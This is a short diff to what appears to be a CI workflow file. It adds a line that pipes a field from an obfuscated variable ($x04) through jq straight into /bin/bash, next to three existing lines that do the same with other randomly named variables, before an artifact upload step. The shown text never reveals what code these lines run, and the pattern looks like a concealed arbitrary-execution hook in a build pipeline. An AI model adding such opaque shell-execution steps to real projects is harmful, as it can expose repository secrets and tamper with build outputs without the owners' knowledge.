@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$kdil4" | jq -r .b4089 | /bin/bash
           printf '%s' "$exvs11" | jq -r .ojiu5 | /bin/bash
           printf '%s' "$bdr607" | jq -r .dz028 | /bin/bash
+          echo $x04 | jq -r .xxzb3665 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
